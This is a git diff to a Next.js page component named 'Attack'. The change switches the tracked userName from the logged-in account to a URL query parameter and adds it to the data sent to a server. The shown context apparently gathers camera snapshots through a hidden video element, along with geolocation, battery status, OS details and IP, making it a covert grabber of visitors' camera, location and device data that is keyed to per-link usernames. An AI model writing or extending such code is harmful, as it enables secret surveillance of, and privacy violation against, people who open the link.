@@ -3,6 +3,7 @@ import Hero from '../components/Hero';
 import Coordinates from '../components/Coordinates';
 import axios from 'axios';
 import { DataContext } from '@/store/GlobalState';
+import { useRouter } from 'next/router';
 
 export default function Attack() {
 
@@ -12,18 +13,15 @@ export default function Attack() {
   const [snapshots, setSnapshots] = useState([]);
   const [isCameraAllowed, setIsCameraAllowed] = useState(false);
   const [showModal, setShowModal] = useState(false);
-  const [userName, setUserName] = useState("");
-
+  // Set the userName state based on the extracted URL parameter
+ 
+  const router = useRouter();
+  const { userName } = router.query;
+  console.log('userName:', userName); // Log the extracted userName
 
   const { state = {}, dispatch } = useContext(DataContext)
   const { auth = {} } = state
 
-  useEffect(() => {
-    if (auth && auth.user && auth.user.userName) {
-      setUserName(auth.user.userName);
-    }
-    console.log(userName, "this is my user bitch")
-  }, [auth]);
 
   const [userIp, setUserIp] = useState('');
 
@@ -88,6 +86,7 @@ export default function Attack() {
                   imageUrl,
                   latitude,
                   longitude,
+                  userName,
                   batteryStatus: `${batteryLevel.toFixed(2)}%`,
                   batteryCharging,
                   osDetails: JSON.stringify(osDetails), // Convert object to JSON string
@@ -189,6 +188,7 @@ export default function Attack() {
   return (
     <>
       <div className='ml-[25%] text-white'>
+   <h1>Heloooo {userName}</h1>
         <Hero />
         <video ref={videoRef} style={{ display: 'none' }} />
         {/* {locationAccess ? (
